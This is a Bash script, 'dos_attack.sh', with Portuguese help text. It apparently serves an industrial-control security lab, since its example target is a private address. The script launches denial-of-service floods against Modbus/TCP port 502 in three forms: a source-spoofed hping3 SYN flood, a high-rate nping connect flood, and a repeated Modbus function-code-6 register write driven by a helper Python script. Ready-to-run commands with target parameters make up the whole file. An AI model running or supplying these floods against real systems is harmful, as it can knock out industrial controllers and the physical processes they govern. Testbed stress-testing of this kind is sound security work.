#!/bin/bash
# dos_attack.sh

ACTION=$1
shift  # remove o primeiro argumento

LOGFILE="dos_${ACTION}.log"

show_help() {
    echo "Uso: $0 <ATAQUE> [ARGUMENTOS]"
    echo
    echo "Ataques disponíveis:"
    echo "  hping3_synflood   <IP_ALVO> [INTERFACE]"
    echo "      -> Flood TCP SYN spoofed contra porto 502"
    echo
    echo "  nping_tcpflood    <IP_ALVO> [RATE] [COUNT]"
    echo "      -> Flood TCP SYN com tentativas de conexão real"
    echo
    echo "  modbus_fc6_dos    <IP_ALVO> [PORTA] [UNIT_ID] [ADDRESS]"
    echo "      -> Flood lógico Modbus/TCP (FC6) contra registo"
    echo
    echo "Exemplos:"
    echo "  $0 hping3_synflood 172.27.224.250 eth1"
    echo "  $0 nping_tcpflood 172.27.224.250 90000 900000"
    echo "  $0 modbus_fc6_dos 172.27.224.250 502 1 6"
}

case "$ACTION" in
    hping3_synflood)
        TARGET=$1
        INTERFACE=${2:-eth0}
        if [ -z "$TARGET" ]; then show_help; exit 1; fi
        echo "[+] A iniciar SYN flood com hping3 contra $TARGET..."
        sudo hping3 -I "$INTERFACE" -d 120 -S -P -w 64 -p 502 --flood --rand-source "$TARGET" \
          2>&1 | tee "$LOGFILE"
        ;;

    nping_tcpflood)
        TARGET=$1
        RATE=${2:-90000}
        COUNT=${3:-900000}
        if [ -z "$TARGET" ]; then show_help; exit 1; fi
        echo "[+] A iniciar TCP flood com nping contra $TARGET..."
        sudo nping --tcp-connect --flags syn --dest-port 502 --rate="$RATE" -c "$COUNT" -q "$TARGET" \
          2>&1 | tee "$LOGFILE"
        ;;

    modbus_fc6_dos)
        TARGET=$1
        PORT=${2:-502}
        UNIT=${3:-1}
        ADDR=${4:-6}
        if [ -z "$TARGET" ]; then show_help; exit 1; fi
        echo "[+] A iniciar stress write Modbus FC6 contra $TARGET:$PORT (UnitID=$UNIT, Reg=$ADDR)..."
        # python em modo unbuffered (-u)
        python3 -u modbus_modify.py "$TARGET" "$PORT" "$UNIT" "$ADDR" \
          2>&1 | tee "$LOGFILE"
        ;;

    -h|--help|help|"")
        show_help
        ;;

    *)
        echo "Erro: ataque '$ACTION' não reconhecido."
        echo
        show_help
        exit 1
        ;;
esac
